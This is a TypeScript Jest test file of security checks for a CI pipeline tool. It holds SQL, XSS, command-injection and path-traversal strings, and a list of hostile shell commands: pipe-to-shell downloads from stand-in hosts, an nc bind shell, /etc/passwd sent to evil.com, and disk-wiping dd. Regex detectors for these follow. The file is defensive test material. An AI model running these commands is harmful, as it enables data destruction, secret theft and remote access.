/**
 * Pipeline Security Unit Tests
 * 
 * Security-focused tests for pipeline management functionality
 * covering input validation, access control, and security best practices.
 */

import { describe, expect, test } from '@jest/globals';

describe('Pipeline Security Tests', () => {
    describe('Input Validation Security', () => {
        test('should validate repository names against injection attacks', () => {
            const validRepository = 'workspace/valid-repo';
            const invalidRepositories = [
                "workspace/repo'; DROP TABLE pipelines; --",  // SQL injection
                'workspace/<script>alert("xss")</script>',   // XSS injection
                'workspace/repo$(rm -rf /)',                  // Command injection
                '../../../etc/passwd',                        // Path traversal
                'workspace/repo\x00malicious',                // Null byte injection
            ];

            // Valid repository should pass basic format validation
            expect(validRepository).toMatch(/^[a-zA-Z0-9_-]+\/[a-zA-Z0-9_-]+$/);

            // Invalid repositories should fail validation
            invalidRepositories.forEach(repo => {
                expect(repo).not.toMatch(/^[a-zA-Z0-9_-]+\/[a-zA-Z0-9_-]+$/);
            });
        });

        test('should validate pipeline IDs against malicious input', () => {
            const validPipelineId = 'pipeline-123';
            const invalidPipelineIds = [
                "'; DROP TABLE pipelines; --",
                '<script>alert("xss")</script>',
                '../../../sensitive-file',
                'pipeline\x00malicious',
                'pipeline$(rm -rf /)',
            ];

            // Valid pipeline ID should pass basic format validation
            expect(validPipelineId).toMatch(/^[a-zA-Z0-9_-]+$/);

            // Invalid pipeline IDs should fail validation
            invalidPipelineIds.forEach(id => {
                expect(id).not.toMatch(/^[a-zA-Z0-9_-]+$/);
            });
        });

        test('should sanitize pipeline configuration names', () => {
            const validNames = [
                'Build Pipeline',
                'Test-Suite-2024',
                'Production_Deploy',
                'Feature/Branch-CI'
            ];

            const maliciousNames = [
                '<script>alert("xss")</script>',
                '"; DROP TABLE pipelines; --',
                '$(rm -rf /)',
                '../../../etc/passwd',
                'name\x00malicious'
            ];

            // Valid names should pass basic sanitization checks
            validNames.forEach(name => {
                expect(name).not.toMatch(/<script|javascript:|vbscript:|on\w+=/i);
                expect(name).not.toMatch(/['"`;]|--|\/\*|\*\//);
                expect(name).not.toMatch(/\$\(|\`|\\x00/);
            });

            // Malicious names should be detected
            maliciousNames.forEach(name => {
                const hasMaliciousPattern =
                    /<script|javascript:|vbscript:|on\w+=/i.test(name) ||
                    /['"`;]|--|\/\*|\*\//.test(name) ||
                    /\$\(|\`|\\x00/.test(name);
                expect(hasMaliciousPattern).toBe(true);
            });
        });
    });

    describe('Access Control Security', () => {
        test('should enforce proper permission validation', () => {
            const validPermissions = ['read', 'execute', 'configure', 'admin'];
            const invalidPermissions = [
                'sudo',
                'root',
                'superuser',
                'all',
                '<script>alert("xss")</script>',
                '"; DROP TABLE users; --'
            ];

            // Valid permissions should be in allowed list
            validPermissions.forEach(permission => {
                expect(['read', 'execute', 'configure', 'admin', 'view']).toContain(permission);
            });

            // Invalid permissions should not be allowed
            invalidPermissions.forEach(permission => {
                expect(['read', 'execute', 'configure', 'admin', 'view']).not.toContain(permission);
            });
        });

        test('should validate user roles and groups', () => {
            const validRoles = ['developer', 'admin', 'viewer', 'operator'];
            const maliciousRoles = [
                '<script>alert("xss")</script>',
                '"; DELETE FROM roles; --',
                'admin\x00guest',
                '../../admin',
                '$(whoami)'
            ];

            // Valid roles should pass basic format checks
            validRoles.forEach(role => {
                expect(role).toMatch(/^[a-zA-Z0-9_-]+$/);
            });

            // Malicious roles should fail validation
            maliciousRoles.forEach(role => {
                expect(role).not.toMatch(/^[a-zA-Z0-9_-]+$/);
            });
        });
    });

    describe('Resource Security Limits', () => {
        test('should enforce reasonable execution time limits', () => {
            const reasonableTimeouts = [300, 1800, 3600, 7200]; // 5min to 2hrs
            const excessiveTimeouts = [86400, 604800, 2592000]; // 1day to 1month

            reasonableTimeouts.forEach(timeout => {
                expect(timeout).toBeLessThanOrEqual(7200); // Max 2 hours
            });

            excessiveTimeouts.forEach(timeout => {
                expect(timeout).toBeGreaterThan(7200);
            });
        });

        test('should enforce memory usage limits', () => {
            const reasonableMemoryMB = [512, 1024, 2048, 4096, 8192]; // 512MB to 8GB
            const excessiveMemoryMB = [16384, 32768, 65536, 131072]; // 16GB to 128GB

            reasonableMemoryMB.forEach(memory => {
                expect(memory).toBeLessThanOrEqual(8192); // Max 8GB
            });

            excessiveMemoryMB.forEach(memory => {
                expect(memory).toBeGreaterThan(8192);
            });
        });

        test('should enforce CPU core limits', () => {
            const reasonableCores = [1, 2, 4, 8];
            const excessiveCores = [16, 32, 64, 128];

            reasonableCores.forEach(cores => {
                expect(cores).toBeLessThanOrEqual(8);
            });

            excessiveCores.forEach(cores => {
                expect(cores).toBeGreaterThan(8);
            });
        });
    });

    describe('Script and Command Security', () => {
        test('should detect potentially dangerous commands in scripts', () => {
            const dangerousCommands = [
                'rm -rf /',
                'sudo rm -rf',
                'curl http://malicious-site.com | sh',
                'wget http://evil.com/script.sh && chmod +x script.sh && ./script.sh',
                'eval $(curl -s http://attacker.com/payload)',
                'nc -l -p 1234 -e /bin/sh',
                'python -c "import os; os.system(\'rm -rf /\')"',
                '$(curl -s http://malicious.com/steal-env)',
                'cat /etc/passwd | curl -X POST http://evil.com/data -d @-',
                'dd if=/dev/zero of=/dev/sda bs=1M'
            ];

            const safeCommands = [
                'npm install',
                'npm test',
                'docker build -t myapp .',
                'git clone https://github.com/user/repo.git',
                'echo "Hello World"',
                'ls -la',
                'pwd',
                'whoami'
            ];

            // Define patterns for dangerous commands
            const dangerousPatterns = [
                /rm\s+-rf\s*\/|sudo\s+rm/i,                              // Destructive file operations
                /curl.*\|\s*sh|wget.*&&.*chmod.*&&/i,                    // Download and execute
                /eval\s*\$\(|nc\s+-l.*-e|dd\s+if=.*of=/i,              // Code execution and system damage
                /cat\s+\/etc\/passwd|curl.*-X\s+POST.*-d/i,             // Data exfiltration
                /\$\(curl|`curl|fetch.*evil|malicious/i                  // Suspicious network calls
            ];

            dangerousCommands.forEach(command => {
                const isDangerous = dangerousPatterns.some(pattern => pattern.test(command));
                expect(isDangerous).toBe(true);
            });

            safeCommands.forEach(command => {
                const isDangerous = dangerousPatterns.some(pattern => pattern.test(command));
                expect(isDangerous).toBe(false);
            });
        });

        test('should validate environment variable security', () => {
            const sensitivePatterns = [
                'AWS_SECRET_ACCESS_KEY',
                'DATABASE_PASSWORD',
                'API_KEY',
                'PRIVATE_KEY',
                'SECRET_TOKEN',
                'OAUTH_SECRET'
            ];

            const suspiciousValues = [
                '${file:/etc/passwd}',
                '$(cat /etc/shadow)',
                '`curl http://malicious.com`',
                'AKIA1234567890ABCDEF', // AWS access key pattern
                '-----BEGIN PRIVATE KEY-----' // Private key pattern
            ];

            // Check for sensitive variable names
            sensitivePatterns.forEach(varName => {
                expect(varName).toMatch(/SECRET|KEY|PASSWORD|TOKEN/i);
            });

            // Check for suspicious values
            suspiciousValues.forEach(value => {
                const isSuspicious =
                    /\$\{file:|`.*`|\$\(.*\)|AKIA[0-9A-Z]{16}|-----BEGIN/.test(value);
                expect(isSuspicious).toBe(true);
            });
        });
    });

    describe('Network and IP Security', () => {
        test('should validate IP address formats', () => {
            const validIPs = [
                '192.168.1.1',
                '10.0.0.1',
                '172.16.0.1',
                '203.0.113.1'
            ];

            const invalidIPs = [
                '999.999.999.999',
                '192.168.1',
                '192.168.1.1.1',
                'not-an-ip',
                '192.168.1.-1'
            ];

            const ipPattern = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;

            validIPs.forEach(ip => {
                expect(ip).toMatch(ipPattern);
            });

            invalidIPs.forEach(ip => {
                expect(ip).not.toMatch(ipPattern);
            });
        });

        test('should validate CIDR notation for IP ranges', () => {
            const validCIDRs = [
                '192.168.1.0/24',
                '10.0.0.0/8',
                '172.16.0.0/16',
                '203.0.113.0/32'
            ];

            const invalidCIDRs = [
                '192.168.1.0/33',  // Invalid subnet mask
                '999.999.999.999/24',  // Invalid IP
                '192.168.1.0',     // Missing CIDR
                '192.168.1.0/-1',  // Negative mask
                '192.168.1.0/mask' // Non-numeric mask
            ];

            const cidrPattern = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\/(?:[0-9]|[1-2][0-9]|3[0-2])$/;

            validCIDRs.forEach(cidr => {
                expect(cidr).toMatch(cidrPattern);
            });

            invalidCIDRs.forEach(cidr => {
                expect(cidr).not.toMatch(cidrPattern);
            });
        });
    });

    describe('Data Protection and Privacy', () => {
        test('should identify potentially sensitive data patterns', () => {
            const sensitivePatterns = [
                '4111-1111-1111-1111',        // Credit card number
                'sk_test_1234567890abcdef',    // Stripe secret key
                'xoxb-1234-5678-91011',       // Slack bot token
                'ya29.1234567890abcdef',      // Google OAuth token
                'EAABwzLixnjYBAABwzLixnjY', // Facebook access token
                'ghp_1234567890abcdef1234567890abcdef12', // GitHub personal access token
            ];

            const patterns = [
                /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/,  // Credit card
                /sk_live_[a-zA-Z0-9]{24}|sk_test_[a-zA-Z0-9]{24}/, // Stripe
                /xoxb-\d+-\d+-\d+-[a-f0-9]+/, // Slack
                /ya29\.[a-zA-Z0-9_-]+/, // Google
                /EAA[a-zA-Z0-9]+/, // Facebook
                /ghp_[a-zA-Z0-9]{36}/, // GitHub
            ];

            sensitivePatterns.forEach((data, index) => {
                expect(data).toMatch(patterns[index]);
            });
        });

        test('should validate data retention policies', () => {
            const validRetentionPeriods = [30, 90, 365, 1095, 2555]; // days
            const invalidRetentionPeriods = [-1, 0, 10000, 36500]; // Invalid periods

            validRetentionPeriods.forEach(period => {
                expect(period).toBeGreaterThan(0);
                expect(period).toBeLessThanOrEqual(2555); // Max ~7 years
            });

            invalidRetentionPeriods.forEach(period => {
                const isValid = period > 0 && period <= 2555;
                expect(isValid).toBe(false);
            });
        });
    });

    describe('Audit and Compliance Security', () => {
        test('should validate audit log integrity requirements', () => {
            const requiredAuditFields = [
                'timestamp',
                'user_id',
                'action',
                'resource',
                'ip_address',
                'user_agent',
                'result'
            ];

            const mockAuditEntry = {
                timestamp: '2024-09-24T10:00:00Z',
                user_id: 'user123',
                action: 'create_pipeline',
                resource: 'pipeline-456',
                ip_address: '192.168.1.100',
                user_agent: 'Mozilla/5.0',
                result: 'success'
            };

            requiredAuditFields.forEach(field => {
                expect(mockAuditEntry).toHaveProperty(field);
            });

            // Validate timestamp format (ISO 8601)
            expect(mockAuditEntry.timestamp).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{3})?Z$/);
        });

        test('should validate compliance framework requirements', () => {
            const supportedFrameworks = ['GDPR', 'SOX', 'HIPAA', 'PCI-DSS', 'ISO27001'];
            const complianceRequirements: Record<string, string[]> = {
                'GDPR': ['data_minimization', 'consent_management', 'right_to_deletion'],
                'SOX': ['financial_controls', 'audit_trail', 'segregation_of_duties'],
                'HIPAA': ['data_encryption', 'access_controls', 'audit_logs'],
                'PCI-DSS': ['data_protection', 'secure_transmission', 'vulnerability_management'],
                'ISO27001': ['risk_management', 'incident_response', 'continuous_monitoring']
            };

            supportedFrameworks.forEach(framework => {
                expect(complianceRequirements).toHaveProperty(framework);
                expect(complianceRequirements[framework]).toBeInstanceOf(Array);
                expect(complianceRequirements[framework].length).toBeGreaterThan(0);
            });
        });
    });

    describe('Error Handling Security', () => {
        test('should not expose sensitive information in error messages', () => {
            const sensitiveInfo = [
                'password123',
                'secret_key_abcdef',
                '/home/user/.ssh/id_rsa',
                'connection_string_with_password',
                'internal_server_details'
            ];

            const safeErrorMessages = [
                'Invalid credentials provided',
                'Access denied',
                'Resource not found',
                'Validation failed',
                'Operation not permitted'
            ];

            const unsafeErrorMessages = [
                'Login failed for user admin with password: password123',
                'Connection failed: mysql://user:secret@localhost/db',
                'File not found: /home/user/.ssh/id_rsa',
                'API key sk_test_1234567890 is invalid',
                'Internal error in module UserAuth at line 245'
            ];

            safeErrorMessages.forEach(message => {
                const containsSensitiveInfo = sensitiveInfo.some(info =>
                    message.toLowerCase().includes(info.toLowerCase())
                );
                expect(containsSensitiveInfo).toBe(false);
            });

            unsafeErrorMessages.forEach(message => {
                const containsSensitiveInfo = sensitiveInfo.some(info =>
                    message.toLowerCase().includes(info.toLowerCase()) ||
                    /password|secret|key|connection|internal/.test(message.toLowerCase())
                );
                expect(containsSensitiveInfo).toBe(true);
            });
        });
    });
});